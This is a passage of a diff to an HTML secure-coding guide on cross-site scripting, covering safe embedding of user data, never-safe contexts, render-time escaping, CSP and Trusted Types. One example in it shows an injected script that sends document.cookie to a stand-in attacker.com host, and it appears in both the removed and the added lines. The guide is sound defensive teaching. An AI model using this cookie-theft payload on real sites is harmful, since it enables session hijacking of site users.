-<span id="cb19-2"><a href="#cb19-2" aria-hidden="true" tabindex="-1"></a>  <span class="kw">const</span> user <span class="op">=</span> <span class="st">&quot;&quot;</span><span class="op">;</span> <span class="fu">fetch</span>(<span class="st">&#39;https://attacker.com/steal?c=&#39;</span><span class="op">+</span><span class="bu">document</span><span class="op">.</span><span class="at">cookie</span>)<span class="op">;</span> <span class="st">&quot;&quot;</span><span class="op">;</span></span>
-<span id="cb19-3"><a href="#cb19-3" aria-hidden="true" tabindex="-1"></a>  <span class="fu">showGreeting</span>(user)<span class="op">;</span></span>
-<span id="cb19-4"><a href="#cb19-4" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span></code></pre></div>
+  <div class="sourceCode" id="cb20"><pre
+  class="sourceCode html"><code class="sourceCode html"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">script</span><span class="dt">&gt;</span></span>
+<span id="cb20-2"><a href="#cb20-2" aria-hidden="true" tabindex="-1"></a>  <span class="kw">const</span> user <span class="op">=</span> <span class="st">&quot;&quot;</span><span class="op">;</span> <span class="fu">fetch</span>(<span class="st">&#39;https://attacker.com/steal?c=&#39;</span><span class="op">+</span><span class="bu">document</span><span class="op">.</span><span class="at">cookie</span>)<span class="op">;</span> <span class="st">&quot;&quot;</span><span class="op">;</span></span>
+<span id="cb20-3"><a href="#cb20-3" aria-hidden="true" tabindex="-1"></a>  <span class="fu">showGreeting</span>(user)<span class="op">;</span></span>
+<span id="cb20-4"><a href="#cb20-4" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span></code></pre></div>
   <p>One way to safely embed user data is to encode it using hexadecimal
   or base64, embed the encoded string into the script context, and then
   decode the string from within the script. For example:</p>
-  <div class="sourceCode" id="cb20"><pre
-  class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> userName <span class="op">=</span> <span class="fu">getUserInput</span>()<span class="op">;</span></span>
-<span id="cb20-2"><a href="#cb20-2" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> script <span class="op">=</span> <span class="vs">`</span></span>
-<span id="cb20-3"><a href="#cb20-3" aria-hidden="true" tabindex="-1"></a><span class="vs">  &lt;script&gt;</span></span>
-<span id="cb20-4"><a href="#cb20-4" aria-hidden="true" tabindex="-1"></a><span class="vs">    const user = hexDecode(&quot;</span><span class="sc">${</span><span class="fu">hexEncode</span>(userName)<span class="sc">}</span><span class="vs">)&quot;;</span></span>
-<span id="cb20-5"><a href="#cb20-5" aria-hidden="true" tabindex="-1"></a><span class="vs">    showGreeting(user);</span></span>
-<span id="cb20-6"><a href="#cb20-6" aria-hidden="true" tabindex="-1"></a><span class="vs">  &lt;/script&gt;</span></span>
-<span id="cb20-7"><a href="#cb20-7" aria-hidden="true" tabindex="-1"></a><span class="vs">`</span><span class="op">;</span></span></code></pre></div>
+  <div class="sourceCode" id="cb21"><pre
+  class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> userName <span class="op">=</span> <span class="fu">getUserInput</span>()<span class="op">;</span></span>
+<span id="cb21-2"><a href="#cb21-2" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> script <span class="op">=</span> <span class="vs">`</span></span>
+<span id="cb21-3"><a href="#cb21-3" aria-hidden="true" tabindex="-1"></a><span class="vs">  &lt;script&gt;</span></span>
+<span id="cb21-4"><a href="#cb21-4" aria-hidden="true" tabindex="-1"></a><span class="vs">    const user = hexDecode(&quot;</span><span class="sc">${</span><span class="fu">hexEncode</span>(userName)<span class="sc">}</span><span class="vs">)&quot;;</span></span>
+<span id="cb21-5"><a href="#cb21-5" aria-hidden="true" tabindex="-1"></a><span class="vs">    showGreeting(user);</span></span>
+<span id="cb21-6"><a href="#cb21-6" aria-hidden="true" tabindex="-1"></a><span class="vs">  &lt;/script&gt;</span></span>
+<span id="cb21-7"><a href="#cb21-7" aria-hidden="true" tabindex="-1"></a><span class="vs">`</span><span class="op">;</span></span></code></pre></div>
   <p>Alternatively, you can use a <a
   href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/template"><code>&lt;template&gt;</code>
   tag</a> to store data that won’t visibly render, using HTML element
   escaping rules, and then fetch the contents from within
   JavaScript:</p>
-  <div class="sourceCode" id="cb21"><pre
-  class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> userName <span class="op">=</span> <span class="fu">getUserInput</span>()<span class="op">;</span></span>
-<span id="cb21-2"><a href="#cb21-2" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> html <span class="op">=</span> <span class="vs">`</span></span>
-<span id="cb21-3"><a href="#cb21-3" aria-hidden="true" tabindex="-1"></a><span class="vs">  &lt;template id=&#39;username&#39;&gt;</span><span class="sc">${</span><span class="fu">escapeHtml</span>(userName)<span class="sc">}</span><span class="vs">&lt;/template&gt;</span></span>
-<span id="cb21-4"><a href="#cb21-4" aria-hidden="true" tabindex="-1"></a><span class="vs">  &lt;script&gt;</span></span>
-<span id="cb21-5"><a href="#cb21-5" aria-hidden="true" tabindex="-1"></a><span class="vs">    const user = document.getElementById(&#39;username&#39;).textContent;</span></span>
-<span id="cb21-6"><a href="#cb21-6" aria-hidden="true" tabindex="-1"></a><span class="vs">    showGreeting(user);</span></span>
-<span id="cb21-7"><a href="#cb21-7" aria-hidden="true" tabindex="-1"></a><span class="vs">  &lt;/script&gt;</span></span></code></pre></div>
+  <div class="sourceCode" id="cb22"><pre
+  class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> userName <span class="op">=</span> <span class="fu">getUserInput</span>()<span class="op">;</span></span>
+<span id="cb22-2"><a href="#cb22-2" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> html <span class="op">=</span> <span class="vs">`</span></span>
+<span id="cb22-3"><a href="#cb22-3" aria-hidden="true" tabindex="-1"></a><span class="vs">  &lt;template id=&#39;username&#39;&gt;</span><span class="sc">${</span><span class="fu">escapeHtml</span>(userName)<span class="sc">}</span><span class="vs">&lt;/template&gt;</span></span>
+<span id="cb22-4"><a href="#cb22-4" aria-hidden="true" tabindex="-1"></a><span class="vs">  &lt;script&gt;</span></span>
+<span id="cb22-5"><a href="#cb22-5" aria-hidden="true" tabindex="-1"></a><span class="vs">    const user = document.getElementById(&#39;username&#39;).textContent;</span></span>
+<span id="cb22-6"><a href="#cb22-6" aria-hidden="true" tabindex="-1"></a><span class="vs">    showGreeting(user);</span></span>
+<span id="cb22-7"><a href="#cb22-7" aria-hidden="true" tabindex="-1"></a><span class="vs">  &lt;/script&gt;</span></span></code></pre></div>
   <h3 id="never-safe-contexts">Never-Safe Contexts</h3>
   <p>Some contexts are inherently unsafe and should never include
   untrusted data:</p>
-  <div class="sourceCode" id="cb22"><pre
-  class="sourceCode html"><code class="sourceCode html"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="co">&lt;!-- Direct script content --&gt;</span></span>
-<span id="cb22-2"><a href="#cb22-2" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">script</span><span class="dt">&gt;</span>USER_DATA_HERE<span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span>
-<span id="cb22-3"><a href="#cb22-3" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb22-4"><a href="#cb22-4" aria-hidden="true" tabindex="-1"></a><span class="co">&lt;!-- HTML comments --&gt;</span></span>
-<span id="cb22-5"><a href="#cb22-5" aria-hidden="true" tabindex="-1"></a><span class="co">&lt;!-- USER_DATA_HERE --&gt;</span></span>
-<span id="cb22-6"><a href="#cb22-6" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb22-7"><a href="#cb22-7" aria-hidden="true" tabindex="-1"></a><span class="co">&lt;!-- Tag names --&gt;</span></span>
-<span id="cb22-8"><a href="#cb22-8" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">USER_DATA_HERE</span><span class="ot"> href</span><span class="op">=</span><span class="st">&quot;/foo&quot;</span><span class="dt">&gt;</span></span>
-<span id="cb22-9"><a href="#cb22-9" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb22-10"><a href="#cb22-10" aria-hidden="true" tabindex="-1"></a><span class="co">&lt;!-- Attribute names --&gt;</span></span>
-<span id="cb22-11"><a href="#cb22-11" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">div</span><span class="ot"> USER_DATA_HERE</span><span class="op">=</span><span class="st">&quot;value&quot;</span><span class="dt">&gt;</span></span>
-<span id="cb22-12"><a href="#cb22-12" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb22-13"><a href="#cb22-13" aria-hidden="true" tabindex="-1"></a><span class="co">&lt;!-- CSS --&gt;</span></span>
-<span id="cb22-14"><a href="#cb22-14" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">style</span><span class="dt">&gt;</span>USER_DATA_HERE<span class="dt">&lt;/</span><span class="kw">style</span><span class="dt">&gt;</span></span></code></pre></div>
+  <div class="sourceCode" id="cb23"><pre
+  class="sourceCode html"><code class="sourceCode html"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a><span class="co">&lt;!-- Direct script content --&gt;</span></span>
+<span id="cb23-2"><a href="#cb23-2" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">script</span><span class="dt">&gt;</span>USER_DATA_HERE<span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span>
+<span id="cb23-3"><a href="#cb23-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb23-4"><a href="#cb23-4" aria-hidden="true" tabindex="-1"></a><span class="co">&lt;!-- HTML comments --&gt;</span></span>
+<span id="cb23-5"><a href="#cb23-5" aria-hidden="true" tabindex="-1"></a><span class="co">&lt;!-- USER_DATA_HERE --&gt;</span></span>
+<span id="cb23-6"><a href="#cb23-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb23-7"><a href="#cb23-7" aria-hidden="true" tabindex="-1"></a><span class="co">&lt;!-- Tag names --&gt;</span></span>
+<span id="cb23-8"><a href="#cb23-8" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">USER_DATA_HERE</span><span class="ot"> href</span><span class="op">=</span><span class="st">&quot;/foo&quot;</span><span class="dt">&gt;</span></span>
+<span id="cb23-9"><a href="#cb23-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb23-10"><a href="#cb23-10" aria-hidden="true" tabindex="-1"></a><span class="co">&lt;!-- Attribute names --&gt;</span></span>
+<span id="cb23-11"><a href="#cb23-11" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">div</span><span class="ot"> USER_DATA_HERE</span><span class="op">=</span><span class="st">&quot;value&quot;</span><span class="dt">&gt;</span></span>
+<span id="cb23-12"><a href="#cb23-12" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb23-13"><a href="#cb23-13" aria-hidden="true" tabindex="-1"></a><span class="co">&lt;!-- CSS --&gt;</span></span>
+<span id="cb23-14"><a href="#cb23-14" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">style</span><span class="dt">&gt;</span>USER_DATA_HERE<span class="dt">&lt;/</span><span class="kw">style</span><span class="dt">&gt;</span></span></code></pre></div>
   <p>These contexts are particularly dangerous because there are too
   many ways for attackers to break out of them, making proper escaping
   virtually impossible.</p>
@@ -377,31 +384,31 @@ code span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } /* Warni
   This ensures: - Data is escaped properly for its context - Raw data is
   preserved in the database - Multiple output formats can be
   supported</p>
-  <div class="sourceCode" id="cb23"><pre
-  class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a><span class="co">// Bad - escaping at storage time</span></span>
-<span id="cb23-2"><a href="#cb23-2" aria-hidden="true" tabindex="-1"></a>app<span class="op">.</span><span class="fu">post</span>(<span class="st">&#39;/comments&#39;</span><span class="op">,</span> (req<span class="op">,</span> res) <span class="kw">=&gt;</span> {</span>
-<span id="cb23-3"><a href="#cb23-3" aria-hidden="true" tabindex="-1"></a>  <span class="kw">const</span> escaped <span class="op">=</span> <span class="fu">escapeHtml</span>(req<span class="op">.</span><span class="at">body</span><span class="op">.</span><span class="at">comment</span>)<span class="op">;</span></span>
-<span id="cb23-4"><a href="#cb23-4" aria-hidden="true" tabindex="-1"></a>  db<span class="op">.</span><span class="at">comments</span><span class="op">.</span><span class="fu">insert</span>(escaped)<span class="op">;</span> <span class="co">// Don&#39;t do this</span></span>
-<span id="cb23-5"><a href="#cb23-5" aria-hidden="true" tabindex="-1"></a>})<span class="op">;</span></span>
-<span id="cb23-6"><a href="#cb23-6" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb23-7"><a href="#cb23-7" aria-hidden="true" tabindex="-1"></a><span class="co">// Good - escape at render time</span></span>
-<span id="cb23-8"><a href="#cb23-8" aria-hidden="true" tabindex="-1"></a>app<span class="op">.</span><span class="fu">get</span>(<span class="st">&#39;/post/:id&#39;</span><span class="op">,</span> (req<span class="op">,</span> res) <span class="kw">=&gt;</span> {</span>
-<span id="cb23-9"><a href="#cb23-9" aria-hidden="true" tabindex="-1"></a>  <span class="kw">const</span> comments <span class="op">=</span> db<span class="op">.</span><span class="at">comments</span><span class="op">.</span><span class="fu">findByPostId</span>(req<span class="op">.</span><span class="at">params</span><span class="op">.</span><span class="at">id</span>)<span class="op">;</span></span>
-<span id="cb23-10"><a href="#cb23-10" aria-hidden="true" tabindex="-1"></a>  res<span class="op">.</span><span class="fu">send</span>(<span class="vs">`</span></span>
-<span id="cb23-11"><a href="#cb23-11" aria-hidden="true" tabindex="-1"></a><span class="vs">    </span><span class="sc">${</span>comments<span class="op">.</span><span class="fu">map</span>(c <span class="kw">=&gt;</span> <span class="vs">`&lt;div&gt;</span><span class="sc">${</span><span class="fu">escapeHtml</span>(c)<span class="sc">}</span><span class="vs">&lt;/div&gt;`</span>)<span class="op">.</span><span class="fu">join</span>(<span class="st">&#39;&#39;</span>)<span class="sc">}</span></span>
-<span id="cb23-12"><a href="#cb23-12" aria-hidden="true" tabindex="-1"></a><span class="vs">  `</span>)<span class="op">;</span></span>
-<span id="cb23-13"><a href="#cb23-13" aria-hidden="true" tabindex="-1"></a>})<span class="op">;</span></span></code></pre></div>
+  <div class="sourceCode" id="cb24"><pre
+  class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true" tabindex="-1"></a><span class="co">// Bad - escaping at storage time</span></span>
+<span id="cb24-2"><a href="#cb24-2" aria-hidden="true" tabindex="-1"></a>app<span class="op">.</span><span class="fu">post</span>(<span class="st">&#39;/comments&#39;</span><span class="op">,</span> (req<span class="op">,</span> res) <span class="kw">=&gt;</span> {</span>
+<span id="cb24-3"><a href="#cb24-3" aria-hidden="true" tabindex="-1"></a>  <span class="kw">const</span> escaped <span class="op">=</span> <span class="fu">escapeHtml</span>(req<span class="op">.</span><span class="at">body</span><span class="op">.</span><span class="at">comment</span>)<span class="op">;</span></span>
+<span id="cb24-4"><a href="#cb24-4" aria-hidden="true" tabindex="-1"></a>  db<span class="op">.</span><span class="at">comments</span><span class="op">.</span><span class="fu">insert</span>(escaped)<span class="op">;</span> <span class="co">// Don&#39;t do this</span></span>
+<span id="cb24-5"><a href="#cb24-5" aria-hidden="true" tabindex="-1"></a>})<span class="op">;</span></span>
+<span id="cb24-6"><a href="#cb24-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb24-7"><a href="#cb24-7" aria-hidden="true" tabindex="-1"></a><span class="co">// Good - escape at render time</span></span>
+<span id="cb24-8"><a href="#cb24-8" aria-hidden="true" tabindex="-1"></a>app<span class="op">.</span><span class="fu">get</span>(<span class="st">&#39;/post/:id&#39;</span><span class="op">,</span> (req<span class="op">,</span> res) <span class="kw">=&gt;</span> {</span>
+<span id="cb24-9"><a href="#cb24-9" aria-hidden="true" tabindex="-1"></a>  <span class="kw">const</span> comments <span class="op">=</span> db<span class="op">.</span><span class="at">comments</span><span class="op">.</span><span class="fu">findByPostId</span>(req<span class="op">.</span><span class="at">params</span><span class="op">.</span><span class="at">id</span>)<span class="op">;</span></span>
+<span id="cb24-10"><a href="#cb24-10" aria-hidden="true" tabindex="-1"></a>  res<span class="op">.</span><span class="fu">send</span>(<span class="vs">`</span></span>
+<span id="cb24-11"><a href="#cb24-11" aria-hidden="true" tabindex="-1"></a><span class="vs">    </span><span class="sc">${</span>comments<span class="op">.</span><span class="fu">map</span>(c <span class="kw">=&gt;</span> <span class="vs">`&lt;div&gt;</span><span class="sc">${</span><span class="fu">escapeHtml</span>(c)<span class="sc">}</span><span class="vs">&lt;/div&gt;`</span>)<span class="op">.</span><span class="fu">join</span>(<span class="st">&#39;&#39;</span>)<span class="sc">}</span></span>
+<span id="cb24-12"><a href="#cb24-12" aria-hidden="true" tabindex="-1"></a><span class="vs">  `</span>)<span class="op">;</span></span>
+<span id="cb24-13"><a href="#cb24-13" aria-hidden="true" tabindex="-1"></a>})<span class="op">;</span></span></code></pre></div>
   <h3 id="use-framework-features">2. Use Framework Features</h3>
   <p>Modern frameworks provide XSS protection by default. Use these
   built-in protections instead of writing your own escaping code:</p>
-  <div class="sourceCode" id="cb24"><pre
-  class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true" tabindex="-1"></a><span class="co">// React automatically escapes values in JSX</span></span>
-<span id="cb24-2"><a href="#cb24-2" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> <span class="fu">Comment</span>({ text }) {</span>
-<span id="cb24-3"><a href="#cb24-3" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> <span class="op">&lt;</span>div<span class="op">&gt;</span>{text}<span class="op">&lt;/</span>div<span class="op">&gt;;</span>  <span class="co">// Safe by default</span></span>
-<span id="cb24-4"><a href="#cb24-4" aria-hidden="true" tabindex="-1"></a>}</span>
-<span id="cb24-5"><a href="#cb24-5" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb24-6"><a href="#cb24-6" aria-hidden="true" tabindex="-1"></a><span class="co">// Angular automatically escapes interpolated values</span></span>
-<span id="cb24-7"><a href="#cb24-7" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>div<span class="op">&gt;</span>{{comment}}<span class="op">&lt;/</span>div<span class="op">&gt;</span>  <span class="co">// Safe by default</span></span></code></pre></div>
+  <div class="sourceCode" id="cb25"><pre
+  class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb25-1"><a href="#cb25-1" aria-hidden="true" tabindex="-1"></a><span class="co">// React automatically escapes values in JSX</span></span>
+<span id="cb25-2"><a href="#cb25-2" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> <span class="fu">Comment</span>({ text }) {</span>
+<span id="cb25-3"><a href="#cb25-3" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> <span class="op">&lt;</span>div<span class="op">&gt;</span>{text}<span class="op">&lt;/</span>div<span class="op">&gt;;</span>  <span class="co">// Safe by default</span></span>
+<span id="cb25-4"><a href="#cb25-4" aria-hidden="true" tabindex="-1"></a>}</span>
+<span id="cb25-5"><a href="#cb25-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb25-6"><a href="#cb25-6" aria-hidden="true" tabindex="-1"></a><span class="co">// Angular automatically escapes interpolated values</span></span>
+<span id="cb25-7"><a href="#cb25-7" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>div<span class="op">&gt;</span>{{comment}}<span class="op">&lt;/</span>div<span class="op">&gt;</span>  <span class="co">// Safe by default</span></span></code></pre></div>
   <h3 id="content-security-policy-csp">3. Content Security Policy
   (CSP)</h3>
   <p>Content Security Policy is a powerful defense mechanism that helps
@@ -469,9 +476,13 @@ code span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } /* Warni
         &#39;nonce-random123&#39;        # Specific inline scripts
         &#39;strict-dynamic&#39;         # Trust scripts loaded by trusted scripts</code></pre>
   <h4 id="an-example-csp">An example CSP</h4>
-  <p>Let’s build a policy for a website that needs to: 1. Load its own
-  resources 2. Use Google Analytics 3. Load images from a CDN 4. Prevent
-  framing from other sites</p>
+  <p>Let’s build a policy for a website that needs to:</p>
+  <ol type="1">
+  <li>Load its own resources</li>
+  <li>Use Google Analytics</li>
+  <li>Load images from a CDN</li>
+  <li>Prevent framing from other sites</li>
+  </ol>
   <p>The policy would look as follows:</p>
   <pre class="http"><code>Content-Security-Policy:
     default-src &#39;self&#39;;                                 # Base rule
@@ -484,10 +495,10 @@ code span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } /* Warni
   ‘unsafe-inline’, use <strong><em>random</em></strong> nonces to allow
   specific inline scripts:</p>
   <pre class="http"><code>Content-Security-Policy: script-src &#39;nonce-random123&#39;</code></pre>
-  <div class="sourceCode" id="cb29"><pre
-  class="sourceCode html"><code class="sourceCode html"><span id="cb29-1"><a href="#cb29-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">script</span><span class="ot"> nonce</span><span class="op">=</span><span class="st">&quot;random123&quot;</span><span class="dt">&gt;</span></span>
-<span id="cb29-2"><a href="#cb29-2" aria-hidden="true" tabindex="-1"></a>  <span class="co">// This inline script is allowed</span></span>
-<span id="cb29-3"><a href="#cb29-3" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span></code></pre></div>
+  <div class="sourceCode" id="cb30"><pre
+  class="sourceCode html"><code class="sourceCode html"><span id="cb30-1"><a href="#cb30-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">script</span><span class="ot"> nonce</span><span class="op">=</span><span class="st">&quot;random123&quot;</span><span class="dt">&gt;</span></span>
+<span id="cb30-2"><a href="#cb30-2" aria-hidden="true" tabindex="-1"></a>  <span class="co">// This inline script is allowed</span></span>
+<span id="cb30-3"><a href="#cb30-3" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span></code></pre></div>
   <p>An XSS attacker would not be able to predict the random nonce, so
   they would not be able to inject a <code>&lt;script&gt;</code> tag
   that the CSP would allow execution of.</p></li>
@@ -511,27 +522,27 @@ code span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } /* Warni
   <ol start="2" type="1">
   <li>Create a policy for sanitizing HTML:</li>
   </ol>
-  <div class="sourceCode" id="cb32"><pre
-  class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb32-1"><a href="#cb32-1" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> policy <span class="op">=</span> trustedTypes<span class="op">.</span><span class="fu">createPolicy</span>(<span class="st">&#39;myPolicy&#39;</span><span class="op">,</span> {</span>
-<span id="cb32-2"><a href="#cb32-2" aria-hidden="true" tabindex="-1"></a>  <span class="dt">createHTML</span><span class="op">:</span> (string) <span class="kw">=&gt;</span> {</span>
-<span id="cb32-3"><a href="#cb32-3" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="fu">htmlEscape</span>(string)<span class="op">;</span> <span class="co">// Use a sanitizer</span></span>
-<span id="cb32-4"><a href="#cb32-4" aria-hidden="true" tabindex="-1"></a>  }</span>
-<span id="cb32-5"><a href="#cb32-5" aria-hidden="true" tabindex="-1"></a>})<span class="op">;</span></span></code></pre></div>
+  <div class="sourceCode" id="cb33"><pre
+  class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb33-1"><a href="#cb33-1" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> policy <span class="op">=</span> trustedTypes<span class="op">.</span><span class="fu">createPolicy</span>(<span class="st">&#39;myPolicy&#39;</span><span class="op">,</span> {</span>
+<span id="cb33-2"><a href="#cb33-2" aria-hidden="true" tabindex="-1"></a>  <span class="dt">createHTML</span><span class="op">:</span> (string) <span class="kw">=&gt;</span> {</span>
+<span id="cb33-3"><a href="#cb33-3" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="fu">htmlEscape</span>(string)<span class="op">;</span> <span class="co">// Use a sanitizer</span></span>
+<span id="cb33-4"><a href="#cb33-4" aria-hidden="true" tabindex="-1"></a>  }</span>
+<span id="cb33-5"><a href="#cb33-5" aria-hidden="true" tabindex="-1"></a>})<span class="op">;</span></span></code></pre></div>
   <ol start="3" type="1">
   <li>Use the policy to create trusted HTML:</li>
   </ol>
-  <div class="sourceCode" id="cb33"><pre
-  class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb33-1"><a href="#cb33-1" aria-hidden="true" tabindex="-1"></a><span class="kw">async</span> <span class="kw">function</span> <span class="fu">displayUserContent</span>(userId) {</span>
-<span id="cb33-2"><a href="#cb33-2" aria-hidden="true" tabindex="-1"></a>  <span class="kw">const</span> response <span class="op">=</span> <span class="cf">await</span> <span class="fu">fetch</span>(<span class="vs">`/api/content/</span><span class="sc">${</span>userId<span class="sc">}</span><span class="vs">`</span>)<span class="op">;</span></span>
-<span id="cb33-3"><a href="#cb33-3" aria-hidden="true" tabindex="-1"></a>  <span class="kw">const</span> data <span class="op">=</span> <span class="cf">await</span> response<span class="op">.</span><span class="fu">text</span>()<span class="op">;</span></span>
-<span id="cb33-4"><a href="#cb33-4" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb33-5"><a href="#cb33-5" aria-hidden="true" tabindex="-1"></a>  <span class="co">// This throws an error due to Trusted Types policy:</span></span>
-<span id="cb33-6"><a href="#cb33-6" aria-hidden="true" tabindex="-1"></a>  <span class="bu">document</span><span class="op">.</span><span class="fu">getElementById</span>(<span class="st">&#39;content&#39;</span>)<span class="op">.</span><span class="at">innerHTML</span> <span class="op">=</span> data<span class="op">;</span></span>
-<span id="cb33-7"><a href="#cb33-7" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb33-8"><a href="#cb33-8" aria-hidden="true" tabindex="-1"></a>  <span class="co">// This works safely due to sanitization:</span></span>
-<span id="cb33-9"><a href="#cb33-9" aria-hidden="true" tabindex="-1"></a>  <span class="kw">const</span> safeHtml <span class="op">=</span> policy<span class="op">.</span><span class="fu">createHTML</span>(data)<span class="op">;</span></span>
-<span id="cb33-10"><a href="#cb33-10" aria-hidden="true" tabindex="-1"></a>  <span class="bu">document</span><span class="op">.</span><span class="fu">getElementById</span>(<span class="st">&#39;content&#39;</span>)<span class="op">.</span><span class="at">innerHTML</span> <span class="op">=</span> safeHtml<span class="op">;</span></span>
-<span id="cb33-11"><a href="#cb33-11" aria-hidden="true" tabindex="-1"></a>}</span></code></pre></div>
+  <div class="sourceCode" id="cb34"><pre
+  class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb34-1"><a href="#cb34-1" aria-hidden="true" tabindex="-1"></a><span class="kw">async</span> <span class="kw">function</span> <span class="fu">displayUserContent</span>(userId) {</span>
+<span id="cb34-2"><a href="#cb34-2" aria-hidden="true" tabindex="-1"></a>  <span class="kw">const</span> response <span class="op">=</span> <span class="cf">await</span> <span class="fu">fetch</span>(<span class="vs">`/api/content/</span><span class="sc">${</span>userId<span class="sc">}</span><span class="vs">`</span>)<span class="op">;</span></span>
+<span id="cb34-3"><a href="#cb34-3" aria-hidden="true" tabindex="-1"></a>  <span class="kw">const</span> data <span class="op">=</span> <span class="cf">await</span> response<span class="op">.</span><span class="fu">text</span>()<span class="op">;</span></span>
+<span id="cb34-4"><a href="#cb34-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb34-5"><a href="#cb34-5" aria-hidden="true" tabindex="-1"></a>  <span class="co">// This throws an error due to Trusted Types policy:</span></span>
+<span id="cb34-6"><a href="#cb34-6" aria-hidden="true" tabindex="-1"></a>  <span class="bu">document</span><span class="op">.</span><span class="fu">getElementById</span>(<span class="st">&#39;content&#39;</span>)<span class="op">.</span><span class="at">innerHTML</span> <span class="op">=</span> data<span class="op">;</span></span>
+<span id="cb34-7"><a href="#cb34-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb34-8"><a href="#cb34-8" aria-hidden="true" tabindex="-1"></a>  <span class="co">// This works safely due to sanitization:</span></span>
+<span id="cb34-9"><a href="#cb34-9" aria-hidden="true" tabindex="-1"></a>  <span class="kw">const</span> safeHtml <span class="op">=</span> policy<span class="op">.</span><span class="fu">createHTML</span>(data)<span class="op">;</span></span>
+<span id="cb34-10"><a href="#cb34-10" aria-hidden="true" tabindex="-1"></a>  <span class="bu">document</span><span class="op">.</span><span class="fu">getElementById</span>(<span class="st">&#39;content&#39;</span>)<span class="op">.</span><span class="at">innerHTML</span> <span class="op">=</span> safeHtml<span class="op">;</span></span>
+<span id="cb34-11"><a href="#cb34-11" aria-hidden="true" tabindex="-1"></a>}</span></code></pre></div>
   <h2 id="conclusion">Conclusion</h2>
   <p>Cross-Site Scripting remains one of the most prevalent and
   dangerous web vulnerabilities, in part because attack payloads can
